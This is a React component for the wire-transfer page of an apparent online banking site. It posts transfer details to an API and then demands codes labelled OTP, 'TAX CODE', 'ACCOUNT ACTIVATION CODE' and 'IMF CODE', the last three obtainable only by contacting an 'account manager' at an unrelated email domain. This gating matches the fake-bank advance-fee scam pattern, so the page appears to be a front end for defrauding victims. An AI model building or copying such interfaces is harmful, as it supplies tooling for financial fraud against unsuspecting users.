import React, { useState } from "react";
import { WiretransferWrapper } from "./Wiretransfer";
import useDashboard from "./apifetch";
import { FaArrowLeft } from "react-icons/fa";
import { MdOutlineClose } from "react-icons/md";
import Overlay from "../overlay.jsx";

const Wiretransfer = () => {
  const fetchdata = useDashboard();

  const [amount, setAmount] = useState("");
  const [receiverAccount, setReceiverAccount] = useState("");
  const [receiverName, setReceiverName] = useState("");
  const [receiverBank, setReceiverBank] = useState("");
  const [swiftCode, setSwiftCode] = useState("");
  const [purpose, setPurpose] = useState("");
  const [currentCodeType, setCurrentCodeType] = useState(null);
  const [codeInput, setCodeInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [showCodeModal, setShowCodeModal] = useState(false);

  const handleTransferSubmit = async (e) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    try {
      const token = localStorage.getItem("accessToken");
      if (!token) {
        localStorage.clear();
        window.location.href = "/login";
        return;
      }

      const requestData = {
        amount: parseFloat(amount),
        receiver_account: receiverAccount,
        receiver_name: receiverName,
        receiver_bank: receiverBank,
        swift_code: swiftCode,
        purpose,
      };

      const res = await fetch("https://geochain.app/apps/api/transfers/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
          "Device-ID": "WEB",
        },
        body: JSON.stringify(requestData),
        credentials: "include",
      });

      const data = await res.json();

      if (!res.ok) throw new Error(data.detail || "Transfer failed");

      if (data.code_type || data.next_code_type) {
        // Show modal for next step code
        setCurrentCodeType(data.code_type || data.next_code_type);
        setCodeInput("");
        setShowCodeModal(true);
      } else {
        // Transfer complete
        alert(
          "Transfer successful! Please note that the funds will be processed and should reflect in your account within 3 to 7 working days!",
        );
        setShowCodeModal(false);
        setCurrentCodeType(null);
        setCodeInput("");
        window.location.href = "/transaction";
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleCodeSubmit = async (e) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    try {
      const token = localStorage.getItem("accessToken");
      let codeKey =
        currentCodeType === "email_otp"
          ? "email_otp"
          : `${currentCodeType}_code`;

      const requestData = {
        amount: parseFloat(amount),
        receiver_account: receiverAccount,
        receiver_name: receiverName,
        receiver_bank: receiverBank,
        swift_code: swiftCode,
        purpose,
        [codeKey]: codeInput,
      };

      const res = await fetch("https://geochain.app/apps/api/transfers/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
          "Device-ID": "WEB",
        },
        body: JSON.stringify(requestData),
      });

      const data = await res.json();

      if (!res.ok) throw new Error(data.detail || "Verification failed");

      if (data.code_type) {
        setCurrentCodeType(data.code_type);
        setCodeInput("");
        setShowCodeModal(true);
      } else {
        alert(
          "Transfer successful! Please note that the funds will be processed and should reflect in your account within 3 to 7 working days!",
        );
        setShowCodeModal(false);
        setCurrentCodeType(null);
        setCodeInput("");
        window.location.href = "/transaction";
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleResendOtp = async () => {
    setLoading(true);
    setError("");
    try {
      const token = localStorage.getItem("accessToken");
      const res = await fetch("https://geochain.app/apps/api/transfers/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
          "Device-ID": "WEB",
        },
        body: JSON.stringify({
          resend: true,
        }),
        credentials: "include",
      });

      const data = await res.json();

      if (!res.ok) throw new Error(data.detail || "Failed to resend OTP");

      alert("OTP has been resent successfully.");
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const getCodeLabel = (type) => {
    switch (type) {
      case "email_otp":
        return "{OTP}";
      case "tax":
        return "{TAX CODE}";
      case "activation":
        return "{ACCOUNT ACTIVATION CODE}";
      case "imf":
        return "{IMF CODE}";
      default:
        return "";
    }
  };

  return (
    <WiretransferWrapper>
      {showCodeModal && <Overlay />}

      <div className="profilewrapper">
        <div className="backes">
          <FaArrowLeft
            onClick={() => (window.location.href = "/transfer-list")}
          />
          <p onClick={() => (window.location.href = "/transfer-list")}>
            Transfer
          </p>
        </div>

        <div className="amount">
          <p>
            <strong>Balance</strong>
          </p>
          <strong>
            ${" "}
            {new Intl.NumberFormat("en-US", {
              minimumFractionDigits: 2,
              maximumFractionDigits: 2,
            }).format(fetchdata?.account?.balance)}
          </strong>
        </div>

        <form
          onSubmit={handleTransferSubmit}
          onKeyDown={(e) => {
            // If modal is open, block Enter key on main form
            if (showCodeModal && e.key === "Enter") {
              e.preventDefault();
            }
          }}
        >
          <div>
            <label>From Account</label>
            <input value={fetchdata?.account?.account_number || ""} disabled />
          </div>

          <div>
            <label>Receiver’s Account</label>
            <input
              value={receiverAccount}
              onChange={(e) => setReceiverAccount(e.target.value)}
              required
            />
          </div>

          <div>
            <label>Receiver’s Full Name</label>
            <input
              value={receiverName}
              onChange={(e) => setReceiverName(e.target.value)}
              required
            />
          </div>

          <div>
            <label>Receiver’s Bank</label>
            <input
              value={receiverBank}
              onChange={(e) => setReceiverBank(e.target.value)}
              required
            />
          </div>

          <div>
            <label>Routing Number</label>
            <input
              value={swiftCode}
              onChange={(e) => setSwiftCode(e.target.value)}
              required
            />
          </div>

          <div>
            <label>Purpose of Transfer</label>
            <input
              value={purpose}
              onChange={(e) => setPurpose(e.target.value)}
            />
          </div>

          <div>
            <label>Amount</label>
            <input
              type="number"
              step="0.01"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              required
            />
          </div>

          <div className="btn">
            <button type="submit" disabled={loading}>
              {loading ? "Processing..." : "Transfer"}
            </button>
            {error && <p style={{ color: "red" }}>{error}</p>}
          </div>
        </form>

        {/* styling this one */}
        {showCodeModal && (
          <div className="otp-modal">
            <div className="livdivs">
              <div className="close">
                <h3>
                  Code Required <span>{getCodeLabel(currentCodeType)}</span>
                </h3>

                <p onClick={() => setShowCodeModal(false)}>
                  <MdOutlineClose />
                </p>
              </div>
              <h4>
                Please enter your <span>{getCodeLabel(currentCodeType)}</span>{" "}
                below to process your transfer
              </h4>

              <form className="myotpss" onSubmit={(e) => handleCodeSubmit(e)}>
                <input
                  value={codeInput}
                  onChange={(e) => setCodeInput(e.target.value)}
                  maxLength={6}
                  placeholder="6-digit code"
                  required
                />
                <button className="mysumit" type="submit">
                  {loading ? "Verifying..." : "Verify"}
                </button>

                {/* ONLY show resend for email OTP */}
                {currentCodeType === "email_otp" && (
                  <button
                    className="cancels"
                    type="button"
                    onClick={handleResendOtp}
                  >
                    {loading ? "Sending..." : "Resend OTP"}
                  </button>
                )}

                {(currentCodeType === "tax" ||
                  currentCodeType === "activation" ||
                  currentCodeType === "imf") && (
                  <div className="conatcoffier">
                    <p>
                      If you do not have this code, please contact your account
                      manager
                    </p>
                    <span>info@westventonline.org</span>
                  </div>
                )}
              </form>
              {error && <p style={{ color: "red" }}>{error}</p>}
            </div>
          </div>
        )}
      </div>
    </WiretransferWrapper>
  );
};

export default Wiretransfer;
